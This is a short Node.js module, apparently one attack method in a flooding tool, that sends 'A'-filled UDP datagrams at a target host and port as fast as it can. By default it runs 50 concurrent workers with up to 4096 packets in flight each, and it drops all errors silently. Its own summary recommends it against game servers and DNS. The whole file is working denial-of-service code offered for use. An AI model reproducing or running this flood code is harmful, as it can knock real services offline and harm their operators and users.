'use strict';
const dgram = require('dgram');

module.exports = {
  name: 'UDP',
  layer: 4,
  summary: 'Blasts fixed-size UDP datagrams at the target port. Great for game servers and DNS.',
  defaults: { concurrency: 50, payloadSize: 1024 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const size = Math.min(Math.max(Number(opts.payloadSize) || 1024, 1), 65507);
    const payload = Buffer.alloc(size, 0x41);
    const host = target.ip || target.host;
    const sockets = [];
    const maxInflight = 4096;

    return {
      async worker() {
        const sock = dgram.createSocket('udp4');
        sock.on('error', () => {});
        sockets.push(sock);
        await new Promise((r) => sock.bind(0, () => r()));

        let inflight = 0;
        while (ctx.running) {
          if (inflight >= maxInflight) {
            await new Promise((r) => setImmediate(r));
            continue;
          }
          inflight++;
          sock.send(payload, target.port, host, (err) => {
            inflight--;
            if (err) stats.err(); else stats.hit(payload.length);
          });
        }
      },
      destroy() { for (const s of sockets) { try { s.close(); } catch {} } },
    };
  },
};
